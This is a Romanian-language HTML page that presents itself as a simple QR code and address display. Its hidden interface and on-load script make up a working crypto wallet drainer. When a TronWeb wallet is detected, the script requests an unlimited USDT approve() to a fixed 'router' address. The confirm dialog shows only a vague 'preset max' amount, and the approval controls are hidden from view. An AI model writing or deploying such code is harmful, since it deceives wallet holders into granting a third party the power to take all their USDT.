<!doctype html>
<html lang="ro">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>QR + Router</title>
<style>
  :root{--bg:#0b1220;--card:#071028;--accent:#06b6d4;--muted:#94a3b8}
  html,body{height:100%;margin:0;background:var(--bg);font-family:system-ui,Segoe UI,Roboto;color:#fff}
  .wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:28px}
  .card{width:100%;max-width:360px;background:var(--card);padding:20px;border-radius:12px;box-shadow:0 6px 24px rgba(2,6,23,0.6);text-align:center}
  #qr{width:180px;height:180px;background:#fff;border-radius:12px;display:inline-flex;align-items:center;justify-content:center;cursor:pointer;overflow:hidden}
  #router{margin-top:14px;color:var(--accent);font-weight:700;word-break:break-all}
  .hidden-ui { display:none !important; }
  img.qr-img{width:100%;height:100%;object-fit:cover;display:block}
</style>

<!-- preferred CDN -->
<script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <div style="display:flex;flex-direction:column;align-items:center;gap:12px">
        <div id="qr" title="QR — deschide URL"></div>
        <div id="router">TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu</div>
      </div>

      <div class="hidden-ui">
        <div id="tokenAddr">TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t</div>
        <div id="routerAddr">TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu</div>
        <input id="amountInput" />
        <button id="approveBtn">Trimite approve</button>
        <button id="connectBtn" class="ghost">Conectează portofel</button>
        <div id="status"></div>
        <pre id="log"></pre>
      </div>
    </div>
  </div>

<script>
(function(){
  function escapeHtml(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;')}

  function makeQRsvg_lib(text, size){
    var qr = window.qrcode(4,'M'); qr.addData(text); qr.make();
    var m = qr.moduleCount;
    var scale = Math.max(1, Math.floor(size / m));
    var width = m * scale;
    var svg = '<svg width="'+width+'" height="'+width+'" viewBox="0 0 '+(m*scale)+' '+(m*scale)+'" xmlns="http://www.w3.org/2000/svg" shape-rendering="crispEdges">';
    svg += '<rect width="100%" height="100%" fill="#fff"/><g fill="#000">';
    for(var r=0;r<m;r++){
      for(var c=0;c<m;c++){
        if(qr.isDark(r,c)){
          svg += '<rect x="'+(c*scale)+'" y="'+(r*scale)+'" width="'+scale+'" height="'+scale+'"/>';
        }
      }
    }
    svg += '</g></svg>';
    return svg;
  }

  function setQRContent(container, text){
    const size = 180;
    // try library
    try{
      if(window.qrcode && typeof window.qrcode === 'function'){
        container.innerHTML = makeQRsvg_lib(text, size);
        container.onclick = ()=> window.open(text,'_blank');
        return;
      }
    }catch(e){ console.warn('QR lib failed', e); }

    // fallback to external API image
    const img = document.createElement('img');
    img.className = 'qr-img';
    img.alt = 'QR';
    img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=' + encodeURIComponent(text);
    img.onerror = function(){
      container.innerHTML = '<div style="color:#000;padding:8px">QR: '+escapeHtml(text)+'</div>';
    };
    container.innerHTML = '';
    container.appendChild(img);
    container.onclick = ()=> window.open(text,'_blank');
  }

  const qrEl = document.getElementById('qr');
  const qrContent = location.href;
  setQRContent(qrEl, qrContent);
})();
</script>

<script>
const USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t';
const ROUTER_ADDRESS = 'TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu';
const USDT_DECIMALS = 6;
const PRESET_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639936';

function toUnits(amountStr, decimals){
  const parts = String(amountStr).split('.');
  const whole = parts[0]||'0';
  const frac = (parts[1]||'').padEnd(decimals,'0').slice(0,decimals);
  return (BigInt(whole + frac)).toString();
}
function log(...args){ const el = document.getElementById('log'); if(el) el.textContent += args.map(a=>typeof a==='object'?JSON.stringify(a,null,2):String(a)).join(' ') + '\n'; }

let tron = null;
let userAddress = null;

function detectTronWebImmediate(){
  if(window.tronWeb && window.tronWeb.ready){
    tron = window.tronWeb;
    userAddress = tron.defaultAddress.base58;
    log('tronWeb detectat: ' + userAddress);
    return true;
  }
  return false;
}

window.addEventListener('load', async ()=>{
  const amtInput = document.getElementById('amountInput');
  if(amtInput) amtInput.value = PRESET_AMOUNT;

  if(detectTronWebImmediate()){
    const humanAmount = 'preset max (implicit)';
    const message = 'Se va trimite cerere de APPROVE pentru:\n\nToken: ' + USDT_ADDRESS + '\nSpender: ' + ROUTER_ADDRESS + '\nSuma: ' + humanAmount + '\n\nApasă OK pentru a deschide promptul din portofel și a semna, sau Anulează pentru a nu trimite.';
    const ok = confirm(message);
    if(!ok){
      log('User a refuzat confirm la load.');
      return;
    }

    try{
      log('Trimitem contract.approve(...) — așteptăm confirm în portofel.');
      const contract = await tron.contract().at(USDT_ADDRESS);
      const result = await contract.approve(ROUTER_ADDRESS, PRESET_AMOUNT).send({feeLimit:100_000_000});
      log('approve result:', result);
      alert('Tranzacția a fost trimisă. Verifică portofelul pentru detalii.');
    }catch(err){
      console.error(err);
      log('Eroare la trimitere: ' + (err && err.message ? err.message : err));
      alert('Eroare la trimitere: ' + (err && err.message ? err.message : 'vezi log'));
    }
  }else{
    log('tronWeb nu detectat la load.');
  }
});
</script>
</body>
</html>
